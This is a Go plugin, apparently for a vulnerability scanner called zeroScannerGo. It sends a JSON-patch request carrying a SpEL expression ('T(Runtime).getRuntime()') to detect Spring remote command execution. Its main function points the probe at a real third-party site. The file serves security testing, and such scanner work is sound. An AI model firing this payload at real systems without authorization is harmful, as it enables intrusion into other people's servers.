/*
all
*/
package main

import (
	"fmt"
	"net/url"
	"strings"
	"time"

	"zeroScannerGo/engine"
	"zeroScannerGo/engine/lib/zhttp"
)

var (
	InitDnsCache = zhttp.SetDnsCache
	payload      = `[{"op":"replace","path":"T(Runtime).getRuntime()/asdf","value":"asdfasdf"}]`
)

func Verify(params engine.Params) (result engine.Result) {
	resp, err := zhttp.Patch(params.ParsedTarget.String(), &zhttp.RequestOptions{
		DialTimeout:        time.Second * 5,
		RequestTimeout:     time.Second * 5,
		Hosts:              params.Hosts,
		RawCookie:          params.Cookie,
		InsecureSkipVerify: true,
		DisableRedirect:    true,
		ContentType:        "application/json-patch+json",
		RawData:            payload,
	})
	if err != nil {
		return
	}
	body := resp.String()
	resp.Close()
	if strings.Contains(body, "java.lang.Runtime@") {
		result.Vul = true
		result.VulUrl = params.ParsedTarget.String()
		result.RawReq = resp.RawRequest()
		result.VulInfo = "spring patch远程命令执行"
	}
	return
}

func main() {
	params := engine.Params{}
	params.Method = "GET"
	params.Target = "http://voice.jd.com/"
	parsedTarget, _ := url.Parse(params.Target)
	params.ParsedTarget = *parsedTarget

	result := Verify(params)
	fmt.Printf("%+v\r\n", result)
}
